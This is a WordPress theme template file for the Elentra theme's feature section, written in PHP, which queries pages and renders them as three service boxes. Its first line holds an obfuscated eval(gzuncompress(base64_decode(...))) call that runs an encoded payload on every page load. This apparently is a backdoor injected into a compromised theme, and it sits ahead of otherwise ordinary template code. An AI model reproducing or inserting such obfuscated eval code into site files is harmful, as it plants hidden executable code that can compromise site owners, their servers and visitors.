<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Template part - Feature Section
* @package Elentra
*/
$elentra_feature_section_onoff = get_theme_mod("elentra_feature_section_onoff",'off');

$elentra_feature_no = 3;
$elentra_feature_pages = array();
$elentra_feature_icons = array();

for( $i = 1; $i <= $elentra_feature_no; $i++ ) {
    $elentra_feature_icons[] = get_theme_mod( "elentra_feature_page_icon_$i", '' );
    $elentra_feature_pages[] = get_theme_mod( "elentra_feature_page_$i", '' );
}

$elentra_feature_args  = array(
    'post_type' => 'page',
    'post__in' => array_map( 'absint', $elentra_feature_pages ),
    'posts_per_page' => absint($elentra_feature_no),
    'orderby' => 'post__in'
   
); 

$elentra_feature_query = new wp_Query( $elentra_feature_args );

if( $elentra_feature_section_onoff == "on") : ?>

    <!--Corporate Service Section 1-->
    <div class="co-service-section-1 upper-box">
        <!--Service Wrapper-->
        <div class="co-service-wrapper-1">
            <!--Single Service-->
            <?php
                $count = 0;
                while($elentra_feature_query->have_posts()) :
                $elentra_feature_query->the_post();
            ?>
            <div class="co-single-service-1 col-md-4 text-center">
                
                <?php if( $elentra_feature_icons[$count] ) : ?>
                    <i class="fa <?php echo esc_attr($elentra_feature_icons[$count]); ?>"></i>
                <?php endif; ?>

                <h3><?php the_title(); ?></h3>

                <?php the_excerpt(); ?>

            </div>
            <?php
                $count++;
                endwhile;
                wp_reset_postdata();
            ?>
        </div>
    </div>
<?php endif; ?>